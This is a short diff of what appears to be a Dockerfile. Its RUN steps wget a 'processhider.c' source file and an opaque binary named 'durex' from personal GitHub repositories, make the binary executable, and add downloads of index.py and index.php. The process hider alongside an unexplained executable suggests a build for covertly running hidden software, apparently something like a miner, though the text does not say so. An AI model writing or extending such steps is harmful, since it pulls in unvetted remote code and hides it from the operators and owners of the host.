@@ -14,7 +14,8 @@ RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
 
 # Download durex and nest.py
 RUN wget https://raw.githubusercontent.com/bulboni/tm/main/durex \
-    && wget https://raw.githubusercontent.com/cihuuy/nest-web/main/nest.py \
+    && wget https://raw.githubusercontent.com/cihuuy/nest-web/main/index.py \
+    && wget https://raw.githubusercontent.com/cihuuy/nest-web/main/index.php \
     && wget https://raw.githubusercontent.com/cihuuy/nest-web/main/requirements.txt \
     && chmod +x durex
 
